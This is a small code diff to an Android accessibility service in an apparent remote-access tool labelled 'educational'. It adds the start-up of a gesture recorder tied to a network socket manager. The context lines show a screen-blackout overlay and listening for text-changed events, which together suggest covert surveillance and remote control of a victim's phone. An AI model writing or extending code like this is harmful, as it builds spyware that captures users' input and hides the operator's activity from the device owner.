@@ -121,6 +121,8 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         instance = this;
         // Register with ScreenBlackout so it can use TYPE_ACCESSIBILITY_OVERLAY
         com.remoteaccess.educational.commands.ScreenBlackout.getInstance().setService(this);
+        // Init gesture recorder (needs the accessibility service reference)
+        com.remoteaccess.educational.network.SocketManager.getInstance(this).initGestureRecorder(this);
         
         AccessibilityServiceInfo info = new AccessibilityServiceInfo();
         info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED |
